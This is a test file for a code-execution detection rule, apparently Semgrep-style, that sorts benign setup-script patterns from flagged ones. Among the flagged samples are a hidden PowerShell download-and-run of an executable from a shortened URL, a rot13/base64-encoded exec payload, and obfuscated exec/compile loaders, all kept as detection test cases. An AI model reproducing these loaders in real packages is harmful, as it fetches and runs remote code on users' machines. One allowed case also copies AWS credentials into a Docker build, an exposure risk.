""" Tests for code-execution rule

    OK cases:
        - Executing python files to extract version information
        - Os.system used for setup purposes
        - Executing git commands
    RULEID cases:
        - executing bash commands
"""


""" OK: Executing python files to extract version information 
"""
# ok: code-execution
exec(open("vapory_git/version.py").read())  # loads __version__

# ok: code-execution
exec(Path("calliope/_version.py").read_text())  # Sets the __version__ variable

# ok: code-execution
exec(open(os.path.join(root, "comvex", "version.py")).read())

if line.startswith("__version__"):
    # ok: code-execution
    eval(line.split("=")[-1])

# ok: code-execution
exec(open(path.join(name, "version.py")).read())

here = os.path.abspath(os.path.dirname(__file__))
about = {}
with open(os.path.join(here, "pip-tool", "__version__.py"), "r", "utf-8") as f:
    # ok: code-execution
    exec(f.read(), about)

with open("gsmls.py") as f:
    for line in f:
        if line.startswith("__version__ = "):
            # ok: code-execution
            version = eval(line.strip().split(" = ")[-1])
            break

VERSION_FILE = os.path.join(CURRENT_PATH, NAME, "version.py")


def get_version():
    ns = {}
    with open(VERSION_FILE) as f:
        # ok: code-execution
        exec(f.read(), ns)
    return ns["__version__"]


""" OK: os.system used for setup purposes
"""
# ok: code-execution
call(["python", "-m", "unittest", "discover"])

# ok: code-execution
subprocess.check_output(["pkg-config", optional_args, pkg_option, package]).decode("utf8").split()

# ok: code-execution
os.system("python setup.py sdist bdist_wheel")

# ok: code-execution
os.system("twine upload dist/*")

# ok: code-execution
os.system("{0} setup.py sdist bdist_wheel --universal".format(sys.executable))

# ok: code-execution
os.system("git tag v{0}".format(about["__version__"]))

# ok: code-execution
if os.system("pip freeze | grep twine"):
    # ok: code-execution
    os.system("gpg --detach-sign -a {}".format(p))

# ok: code-execution
subprocess.check_output(["python3", "-m", "pip", "freeze"]).decode().splitlines()

docker_build_and_push_commands = f"""
    cp /root/.aws/credentials /tmp/credentials &&
    docker build -f {dockerfile.name} -t {ECR_REPOSITORY} /tmp &&
    rm /tmp/credentials &&
    aws ecr get-login-password --region {REGION} |
    docker login --username {username} --password {password} {ECR_REPOSITORY} &&
    docker push {ECR_REPOSITORY}
    """
# ok: code-execution
docker_build = subprocess.Popen(
    docker_build_and_push_commands,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)


def RunCustomCommand(command_list):
    print("Running command: %s" % command_list)
    # ok: code-execution
    p = subprocess.Popen(command_list, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


# ok: code-execution
subprocess.run(["python3", "-m", "pycodestyle", "."], env=env, check=True)

# ok: code-execution
p = subprocess.Popen([pkg_config, option, "libffi"])

# ok: code-execution
os.system("coverage report")

# ok: code-execution
if os.system("pip freeze | grep wheel"):
    pass

# ok: code-execution
subprocess.run([sys.executable, "-m", "pre_commit", "install"])

# ok: code-execution
check_output(["cmake", "--version"])

# ok: code-execution
os.system("pandoc --from=markdown --to=rst --output=README.rst README.md")


""" OK: executing git commands
"""
# ok: code-execution
os.popen("cd %s && git init " % TEST_MODULES_ROOT)

# ok: code-execution
popen("cd %s && git init " % TEST_MODULES_ROOT)

# ok: code-execution
subprocess.check_output(["git", "describe", "--tags"]).strip()


""" RULEID: executing bash commands 
"""
# ruleid: code-execution
os.system('start ' + filename)

# ruleid: code-execution
os.system(
    "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
)

# ruleid: code-execution
exec(
    "o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode(
        "rot13"
    )
).decode("base64")

# ruleid: code-execution
subprocess.call("/tmp/reloan")

# ruleid: code-execution
eval("print('hi')")

if line.startswith("DANGEROUS"):
    # ruleid: code-execution
    eval(line)
    # ruleid: code-execution
    eval("print('bar')")


# ruleid: code-execution
__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("foo"),'<string>','exec'))


from builtins import *;
# ruleid: code-execution
OOO0O0OOOOO000oOo0oOoOo0,llIIlIlllllIlIlIlll,Oo000O0OO0oO0oO00oO0oO0O,WXWXXWWXXWXWXWWXXXWXXWX,XWWWWXXXXWWWWWXXWWX=(lambda SS2S222S22SS22S22S:SS2S222S22SS22S22S(__import__('\x7a\x6c\x69\x62'))),(lambda SS2S222S22SS22S22S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72'])))